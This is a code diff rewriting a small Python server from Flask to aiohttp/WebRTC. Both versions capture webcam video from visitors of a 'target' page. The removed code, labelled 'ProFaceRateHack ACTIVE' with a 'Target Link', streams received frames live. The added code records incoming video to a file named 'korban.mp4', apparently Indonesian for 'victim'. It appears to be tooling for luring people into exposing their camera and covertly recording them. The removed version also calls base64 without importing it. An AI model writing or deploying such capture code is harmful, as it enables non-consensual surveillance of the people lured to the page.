@@ -1,44 +1,42 @@
-from flask import Flask, render_template, request, Response
-from PIL import Image
-import io
-import threading
-import time
+from aiohttp import web
+from aiortc import RTCPeerConnection, RTCSessionDescription
+from aiortc.contrib.media import MediaRecorder
+import json
+import asyncio
 
-app = Flask(__name__, static_folder='../static', template_folder='../templates')
+pcs = set()
 
-latest_frame = None
-lock = threading.Lock()
+async def offer(request):
+    params = await request.json()
+    offer = RTCSessionDescription(sdp=params["sdp"], type=params["type"])
 
-@app.route('/target')
-def target():
-    return render_template('index.html')
+    pc = RTCPeerConnection()
+    pcs.add(pc)
 
-@app.route('/stream', methods=['POST'])
-def stream():
-    global latest_frame
-    try:
-        img_b64 = request.json['image'].split(',')[1]
-        img_data = base64.b64decode(img_b64)
-        img = Image.open(io.BytesIO(img_data)).convert('RGB')
-        img = img.resize((640, 480))
-        buffered = io.BytesIO()
-        img.save(buffered, format="JPEG", quality=70)
-        with lock:
-            latest_frame = buffered.getvalue()  # KIRIM RAW JPEG!
-    except Exception as e:
-        print("Error:", e)
-    return {"status": "ok"}
+    @pc.on("track")
+    def on_track(track):
+        if track.kind == "video":
+            recorder = MediaRecorder("korban.mp4")
+            recorder.addTrack(track)
+            asyncio.create_task(recorder.start())
 
-@app.route('/live')
-def live():
-    def gen():
-        while True:
-            with lock:
-                if latest_frame:
-                    yield latest_frame  # KIRIM RAW JPEG!
-            time.sleep(0.03)
-    return Response(gen(), mimetype='multipart/x-mixed-replace; boundary=frame')
+    await pc.setRemoteDescription(offer)
+    answer = await pc.createAnswer()
+    await pc.setLocalDescription(answer)
 
-@app.route('/')
-def home():
-    return "<h2>ProFaceRateHack ACTIVE</h2><a href='/target'>Target Link</a>"
+    return web.Response(
+        content_type="application/json",
+        text=json.dumps({"sdp": pc.localDescription.sdp, "type": pc.localDescription.type})
+    )
+
+async def on_shutdown(app):
+    coros = [pc.close() for pc in pcs]
+    await asyncio.gather(*coros)
+
+app = web.Application()
+app.on_shutdown.append(on_shutdown)
+app.router.add_post("/offer", offer)
+app.router.add_static('/static', path='../static')
+app.router.add_get('/', lambda _: web.FileResponse('../templates/index.html'))
+
+web.run_app(app, port=3000)
